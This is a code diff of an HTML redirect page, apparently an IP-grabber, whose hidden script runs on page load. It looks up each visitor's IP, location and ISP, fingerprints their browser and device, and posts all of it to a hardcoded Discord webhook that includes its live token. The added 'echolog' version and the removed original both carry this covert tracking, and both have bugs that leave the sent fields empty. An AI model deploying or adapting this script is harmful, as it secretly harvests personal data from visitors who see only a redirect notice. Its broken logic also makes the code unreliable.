@@ -6,83 +6,58 @@
   </head>
   <body>
     <script>
-      // original code from https://github.com/Scaratek/Oopsies
+     //replacing with echolog
+       let echolog = {};
+      fetch("https://wtfismyip.com/json")
+        .then((response) => response.json())
+        .then((data) => {
+          let echolog = {
+            ipAddress: data.YourFuckingIPAddress,
+            location: data.YourFuckingLocation,
+            hostname: data.YourFuckingHostname,
+            isp: data.YourFuckingISP,
+            city: data.YourFuckingCity,
+            country: data.YourFuckingCountry,
+            countryCode: data.YourFuckingCountryCode,
+            userAgent: navigator.userAgent,
+            windowProp: Object.keys(window).length,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            windowRatio: window.innerWidth / window.innerHeight,
+            screenWidth: window.screen.availWidth,
+            screenHeight: window.screen.availHeight,
+            screenRatio: window.screen.availWidth / window.screen.availHeight,
+            DPI: window.devicePixelRatio,
+            colorDepth: window.screen.colorDepth,
+            orientation: window.screen.orientation.type,
+            orientationAngle: window.screen.orientation.angle,
+            os: navigator.platform,
+            threads: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory,
+            systemLanguages: navigator.languages.join(", "),
+            languages: navigator.language,
+          };
 
-let oop = {};
-
-// IP/Device Information
-fetch('https://wtfismyip.com/json')
-    .then((response) => response.json())
-    .then((data) => {
-        let oop = {
-        ip: data.YourFuckingIPAddress,
-        location: data.YourFuckingLocation,
-        host: data.YourFuckingHostname,
-        isp: data.YourFuckingISP,
-        city: data.YourFuckingCity,
-        country: data.YourFuckingCountry,
-        countrycode: data.YourFuckingCountryCode,
-        useragent: navigator.userAgent,
-        windowprop: Object.keys(window).length,
-        windowidth: window.innerWidth,
-        windowheight: window.innerHeight,
-        windowratio: window.innerWidth / window.innerHeight,
-        screenwidth: window.screen.availWidth,
-        screenheight: window.screen.availHeight,
-        screenratio: window.screen.availWidth / window.screen.availHeight,
-        dpi: window.devicePixelRatio,
-        colordepth: window.screen.colorDepth,
-        orientation: window.screen.orientation.type,
-        orientationangle: window.screen.orientation.angle,
-        os: navigator.platform,
-        threads: navigator.hardwareConcurrency,
-        memory: navigator.deviceMemory,
-        systemlanguages: navigator.languages.join(", "),
-        languages: navigator.language,
-    };
-
-// Message Sent To Webhook
-const payload = {
-    content: `
-    IP Address: ${oop.op}\n
-    Location: ${oop.location}\n
-    Host Name: ${oop.host}\n
-    ISP: ${oop.isp}\n
-    City: ${oop.city}\n
-    Country: ${oop.country}\n
-    Country Code: ${oop.countrycode}\n
-    User Agent: ${oop.useragent}\n
-    Window Prop: ${oop.windowprop}\n
-    Window Width: ${oop.windowidth}\n
-    Window Height: ${oop.windowheight}\n
-    Window Ratio: ${oop.windowratio}\n
-    Screen Width: ${oop.screenwidth}\n
-    Screen Height: ${oop.screenheight}\n
-    Screen Ratio: ${oop.screenratio}\n
-    DPI: ${oop.dpi}\n
-    Color Depth: ${oop.colordepth}\n
-    Orientation: ${oop.orientation}\n
-    Orientation Angle: ${oop.orientationangle}\n
-    Operation System: ${oop.os}\n
-    Threads: ${oop.threads}\n
-    Memory: ${oop.memory}\n
-    System Languages: ${oop.systemlanguages}\n
-    Languages: ${oop.languages}
-    `,
-};
-
-// Replace With Your Discord Webhook
-fetch("https://discord.com/api/webhooks/1111812835064938646/YWxIWht0WTduwc4Fl-vPElKop1xAH5STalN6oYP6y2XYYEc2-MpE_9ybSMe0BFx-aMZp", {
-    method: "POST",
-    headers: {
-        "Content-Type": "application/json",
-    },
-    body: JSON.stringify(payload),
-    })
-    .then((response) => console.log(response))
-    .catch((error) => console.error(error));
-    })
-    .catch((error) => console.error(error));
+          // Set up the payload for the webhook
+          const payload = {
+            content: `IP Address: ${echolog.ipAddress}\nLocation: ${echolog.location}\nHostname: ${echolog.hostname}\nISP: ${echolog.isp}\nCity: ${echolog.city}\nCountry: ${echolog.country}\nCountry Code: ${echolog.countryCode}\nUser Agent: ${echolog.userAgent}\nWindow Properties: ${echolog.windowProp}\nWindow Width: ${echolog.windowWidth}\nWindow Height: ${echolog.windowHeight}\nWindow Ratio: ${echolog.windowRatio}\nScreen Width: ${echolog.screenWidth}\nScreen Height: ${echolog.screenHeight}\nScreen Ratio: ${echolog.screenRatio}\nDPI: ${echolog.DPI}\nColor Depth: ${echolog.colorDepth}\nOrientation: ${echolog.orientation}\nOrientation Angle: ${echolog.orientationAngle}\nOS: ${echolog.os}\nThreads: ${echolog.threads}\nMemory: ${echolog.memory}\nSystem Languages: ${echolog.systemLanguages}\nLanguages: ${echolog.languages}`,
+          };
+          // This is a lazy way of doing it, having
+          // your webhook url out in the open like
+          // this is a bad idea, you should instead
+          // have it contact a internal API to
+          // forward the request.
+          fetch("https://discord.com/api/webhooks/1111812835064938646/YWxIWht0WTduwc4Fl-vPElKop1xAH5STalN6oYP6y2XYYEc2-MpE_9ybSMe0BFx-aMZp", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          })
+            .then((response) => console.log(response))
+            .catch((error) => console.error(error));
+        })
+        .catch((error) => console.error(error));
     </script>
     <p>redirecting in 5 seconds.</p>
    
